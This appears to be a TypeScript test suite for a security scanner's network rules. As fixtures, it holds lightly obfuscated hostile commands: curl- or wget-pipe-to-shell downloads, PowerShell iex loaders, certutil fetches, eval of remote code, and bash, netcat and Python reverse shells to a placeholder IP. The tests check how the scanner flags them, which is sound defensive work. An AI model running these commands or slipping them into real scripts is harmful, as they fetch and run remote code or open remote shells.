import { test } from 'node:test';
import assert from 'node:assert/strict';
import { file, only, x } from './helpers.ts';

test('NET-001: download-and-execute in scripts is High', () => {
  const cases: [string, string][] = [
    ['install.sh', x('cu§rl -fsSL https://example.invalid/i.sh | s§h')],
    ['setup.sh', x('ba§sh -c "$(cu§rl -fsSL https://example.invalid/i.sh)"')],
    ['get.sh', x('wg§et https://example.invalid/b -O /tmp/b && chm§od +x /tmp/b && /tmp/b')],
    ['run.ps1', x('ir§m https://example.invalid/a.ps1 | ie§x')],
    ['dl.bat', x('cert§util -urlcache -split -f https://example.invalid/a.exe a.exe')],
  ];
  for (const [path, text] of cases) assert.equal(only([file(path, text)], 'NET-001')[0]?.severity, 'high', path);
});

test('NET-001: docs and CI workflows are ignored; container builds are Medium', () => {
  const line = x('cu§rl -fsSL https://example.invalid/i.sh | s§h');
  assert.equal(only([file('README.md', line)], 'NET-001').length, 0);
  assert.equal(only([file('.github/workflows/ci.yml', `run: ${line}`)], 'NET-001').length, 0);
  assert.equal(only([file('Dockerfile', `RUN ${line}`)], 'NET-001')[0]?.severity, 'medium');
});

test('NET-001: data files are ignored but package.json scripts are checked', () => {
  const line = x('cu§rl -fsSL https://example.invalid/i.sh | s§h');
  assert.equal(only([file('corpus/list.jsonl', JSON.stringify({ why: line }))], 'NET-001').length, 0);
  assert.equal(only([file('data/notes.json', JSON.stringify({ why: line }))], 'NET-001').length, 0);
  assert.equal(only([file('package.json', JSON.stringify({ scripts: { postinstall: line } }))], 'NET-001').length, 1);
});

test('NET-003: remote code executed in memory is Critical', () => {
  const cases: [string, string][] = [
    ['a.py', x('ex§ec(requests.get("https://example.invalid/p").text)')],
    ['b.ps1', x('IE§X (New-Object Net.WebClient).Download§String("https://example.invalid/p")')],
    ['c.js', x('ev§al(await (await fet§ch(u)).text())')],
    ['d.sh', x('ev§al "$(cu§rl -s https://example.invalid/p)"')],
  ];
  for (const [path, text] of cases) assert.equal(only([file(path, text)], 'NET-003')[0]?.severity, 'critical', path);
});

test('NET-004: reverse shells are Critical', () => {
  assert.equal(only([file('r.sh', x('ba§sh -i >& /dev/t§cp/203.0.113.5/4444 0>&1'))], 'NET-004')[0]?.severity, 'critical');
  assert.equal(only([file('r2.sh', x('n§c 203.0.113.5 4444 -e /bin/s§h'))], 'NET-004').length, 1);
  const py = x(['import socket,subprocess,os', 's=socket.sock§et(socket.AF_INET,socket.SOCK_STREAM)', 's.connect(("203.0.113.5",4444))', 'os.du§p2(s.fileno(),0)', 'subprocess.ca§ll(["/bin/s§h","-i"])'].join('\n'));
  assert.equal(only([file('r.py', py)], 'NET-004').length, 1);
});

test('NET-004: ordinary socket code is not flagged', () => {
  const py = 'import socket\ns = socket.socket()\ns.connect(("localhost", 8080))\ns.send(b"hi")';
  assert.equal(only([file('client.py', py)], 'NET-004').length, 0);
});
